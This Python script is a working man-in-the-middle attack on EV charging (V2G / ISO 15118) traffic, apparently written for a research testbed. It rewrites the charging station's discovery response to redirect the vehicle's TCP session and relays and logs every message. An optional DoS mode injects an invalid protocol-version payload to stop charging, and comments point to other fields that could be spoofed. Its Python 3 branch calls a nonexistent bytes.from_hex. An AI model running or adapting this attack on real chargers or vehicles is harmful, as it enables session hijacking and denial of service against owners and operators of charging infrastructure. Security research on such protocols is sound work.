import socket
from v2g_tcp import TCPClient, TCPServer
from binascii import hexlify
import requests
import sys
import struct
import threading
from optparse import OptionParser

class V2GTPMessage(object):
    '''
    Constructs a V2G Transfer Protocol message containing the header 
    (which consists of the protocol version, the inverse protocol version, 
    the payload type and payload length) and the payload.
    data: raw bytes from stream
    '''
    def __init__(self, data):
        '''
        data: raw data bytes as input 
        '''
        self.data = data
        self.protocol_version = data[0]
        self.inverse_protocol_version = data[1]
        self.payload_type = data[2:4]
        self.payload_length = data[4:8]
        self.payload = data[8:]

    def alter_payload(self, mod_payload):
        '''
        Alters the payload.
        '''
        # alter payload
        print('Altering payload')
        payload = mod_payload
        # alter payload length
        payload_length = bytearray(struct.pack("BBBB",0,0,0,len(mod_payload)))
        # alter payload and payload length in data
        data = bytearray(self.data)
        data[8:] = payload
        data[4:8] = payload_length
        return data
        

    # Use V2GDecoder to decode the exi.
    def decode_payload_exi(self):
        '''
        The results are very slow due to V2GDecoder.
        '''
        r = requests.post("http://localhost:9000", headers={"Format":"EXI"}, data=hexlify(self.payload))
        print(r.text)
        return r.text

class SECCDiscoveryRes(V2GTPMessage):
    '''
    Initializes the payload of a SECCDiscovery response.
    '''
    def __init__(self, data):
        '''
        This class processes the payload.
        data: raw data bytes as input.
        '''

        super(SECCDiscoveryRes, self).__init__(data)
        self.secc_ip_address = self.payload[:16]
        secc_port = struct.unpack("BB",self.payload[16:18])
        self.secc_port = secc_port[0] << 8 | secc_port[1]
        self.set_security = self.payload[18:19] # [0]
        self.set_transport_protocol = self.payload[19:20] # [0]
     
    def get_altered_data(self, port):
        '''
        Alters the TCP port of SECC.
        '''
        secc_port = port
        # alter payload
        payload = bytearray(self.payload)
        payload[16:18] = struct.pack("BB",port >> 8, port & 0xff)
        # alter data
        data = bytearray(self.data)
        data[8:] = payload
        return SECCDiscoveryRes(data)

if __name__ == "__main__":

    parser = OptionParser()
    parser.add_option("-d", "--DoS", dest="dos_attack", action="store_true", default=False, help="performs a DoS attack by changing the app version of the EV to 0.0")
    (options, args) = parser.parse_args()
    dos_attack = options.dos_attack

    # CONSTANTS
    V2G_UDP_SDP_SERVER_PORT = 15118
    MOD_UDP_SDP_SERVER_PORT = V2G_UDP_SDP_SERVER_PORT + 1
    SECC_FAKE_PORT = 20000

    # read ips from local file
    f = open(".common_ips.txt", "r")
    se_IPv6 = f.readline().rstrip()
    ev_IPv6 = f.readline()
    print("se_IPv6: %s" % se_IPv6)
    print("ev_IPv6: %s" % ev_IPv6)
    if dos_attack:
        print("*****   DoS attack enabled   *****\n"
              "***** Charge will be stopped *****")
    f.close()

    while True:
        print('Starting V2G Man-in-the-middle server.')

        se_addrinfo = socket.getaddrinfo('%s%s' % (se_IPv6,'%mim-eth0'), V2G_UDP_SDP_SERVER_PORT, socket.AF_INET6, socket.SOCK_DGRAM)

        # RiseV2G
        
        # normal flow
        # UDP: ev1          -> se1:15118
        # UDP: se1:15118    -> ev1

        # modified flow with ovs-ofctl
        # a) UDP: ev1             -> mim:15118(->9)
        # b) UDP: mim:15119       -> se1:15118
        # c) UDP: se1:15118       -> mim:15119
        # d) UDP: mim:15119(->8)  -> ev1

        upd_communication_finished = False

        s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)

        print('Waiting for UDP message from ev to se on port %s, changed by flow to %d' % (V2G_UDP_SDP_SERVER_PORT, MOD_UDP_SDP_SERVER_PORT))
        s.bind(('',MOD_UDP_SDP_SERVER_PORT))
        while not upd_communication_finished:
            # a)
            ev1_data, addr = s.recvfrom(72)
            ev1_ip = addr[0]
            udp_ev1_port = addr[1] # UDP port of ev1
            print("EV->MIM %s:%s" % (ev1_ip, udp_ev1_port))
            print("(len=%d) : %s" % (len(ev1_data), hexlify(ev1_data)))
            
            print('Waiting for UDP message from se to ev on port %s' % (udp_ev1_port))
            # b)
            (family, socktype, proto, canonname, se1_ip) = se_addrinfo[0]
            print("MIM->SE (fw) %s:%d" % (se1_ip[0], V2G_UDP_SDP_SERVER_PORT))
            s.sendto(ev1_data, se1_ip)
            while not upd_communication_finished:
                # c)
                se1_data, addr = s.recvfrom(90)
                se1_ip = addr[0] # ip of se1
                udp_se1_port = addr[1] # UDP port of se1
                print("SE->MIM %s:%s" % (se1_ip, udp_se1_port))
                print("(len=%d) : %s" % (len(se1_data), hexlify(se1_data)))
                secc_udp_response = SECCDiscoveryRes(se1_data)
                # alter port
                altered_secc_udp_response = secc_udp_response.get_altered_data(port=SECC_FAKE_PORT)
                print("V2GTPMessage contains TCP secc_ip:secc_port: %s:%s, port altered to %s" % (hexlify(secc_udp_response.secc_ip_address), secc_udp_response.secc_port, altered_secc_udp_response.secc_port))
                # d)
                print("MIM->EV (fw) %s:%s" % (ev1_ip, udp_ev1_port))
                # print('%s%s' % (ev1_ip, '%mim-eth0'))
                if ev1_ip.endswith('%mim-eth0'):
                    full_ev1_ip = ev1_ip
                else:
                    full_ev1_ip = '%s%s' % (ev1_ip, '%mim-eth0')
                ev_addrinfo = socket.getaddrinfo(full_ev1_ip, udp_ev1_port, socket.AF_INET6, socket.SOCK_DGRAM)
                (family, socktype, proto, canonname, ev1_ip) = ev_addrinfo[0]
                s.sendto(altered_secc_udp_response.data, ev1_ip)
                upd_communication_finished = True

        s.close()
        
        # TCP exchanges begin now

        # normal flow
        # TCP: ev1:EVCC_PORT    -> se1:SECC_PORT
        # TCP: se1:SECC_PORT    -> ev1:EVCC_PORT

        # modified flow
        # TCP: ev1:EVCC_PORT        -> mim:SECC_FAKE_PORT (fixed to 20000 by modifying the UDP message)
        # TCP: mim:RAND_PORT        -> se1:SECC_PORT 
        # TCP: se1:SECC_PORT        -> mim:RAND_PORT
        # TCP: mim:SECC_FAKE_PORT   -> ev1:EVCC_PORT

        # TCP socket: connect mim to the server
        if se1_ip.endswith('%mim-eth0'):
            full_se1_ip = se1_ip
        else:
            full_se1_ip = '%s%s' % (se1_ip, '%mim-eth0')
        se_addrinfo = socket.getaddrinfo(full_se1_ip, secc_udp_response.secc_port, socket.AF_INET6, socket.SOCK_STREAM)
        
        se1 = TCPClient(se_addrinfo, 'mim', 'se1')
        se1.connect() # connect mim to se1    

        mim = TCPServer(SECC_FAKE_PORT)
        ev1_conn, addr = mim.accept() # waits for ev1 to connect
        message_count = 0
        
        print(addr, "has connected")

        '''
        messages exchanged:
        1/2) supportedAppProtocolReq/Res: Versions compatibility check (can be modified to perform DOS)
        3/4) SessionSetupReq/Res: Res contains SessionID (can be spoofed)
        5/6) ServiceDiscoveryReq/Res: Res has very meaningful data (includes charging methods, possibly harmful if modified)
        ..
        7/8) PaymentServiceSelectionReq/Res: External Identification used in RiseV2G (just pass it)
        ..
        9/10) AuthorizationReq/Res: (just pass it)
        11/12) ChangeParameterDiscoveryReq/Res: transfer mode, departure time, max voltage (400 V), max current (32 A)
        13/14) PowerDeliveryReq/Res: Start, Stop charge in Req
        15/16) CharginStatusReq/Res (cycle): empty messages
        ..
        end) PowerDeliveryReq/Res: When EV intends to stop/re-negotiate, it sends this message
            SessionStopReq/Res: Can be set to terminate/pause
        '''

        while ev1_data != b'':
            ev1_data = ev1_conn.recv(1024)
            message_count += 1
            try:
                ev1_message = V2GTPMessage(ev1_data)
                # PROBLEM: decoder is very slow
                # if message_count <= 16 and message_count > 10:
                #     th1 = threading.Thread(target=ev1_message.decode_payload_exi)
                #     th1.start()
                if dos_attack and message_count == 1: # supportedAppProtocolReq
                    # this message does not depend on SessionID
                    invalid_version_payload = '8000EBAB9371D34B9B79D189A98989C1D191D191818999D26B9B3A232B30000000280040'
                    # change payload to invalid version
                    if sys.version_info.major == 2:
                        ev1_data = ev1_message.alter_payload(bytearray(invalid_version_payload.decode('hex')))
                    else:
                        ev1_data = ev1_message.alter_payload(bytearray(bytes.from_hex(invalid_version_payload)))
                    ev1_message = V2GTPMessage(ev1_data)
                print("%d) mim -> se1 (EXI - len %s) : %s" % (message_count, hexlify(ev1_message.payload_length), hexlify(ev1_message.payload)))
            except:
                print('ev1: Not a V2GTPMessage')

            se1.send(ev1_data)
            se1_data = se1.get_response()
            message_count += 1
            try:
                se1_message = V2GTPMessage(se1_data)
                print("%d) mim <- se1 (EXI - len %s) : %s" % (message_count, hexlify(se1_message.payload_length), hexlify(se1_message.payload)))
                # PROBLEM: decoder is very slow
                # if message_count <= 16 and message_count > 10:
                #     th2 = threading.Thread(target=se1_message.decode_payload_exi)
                #     th2.start()
            except:
                print('se1: Not a V2GTPMessage')
            ev1_conn.send(se1_data)

        ev1_conn.close()
        
        mim.close()
        se1.close()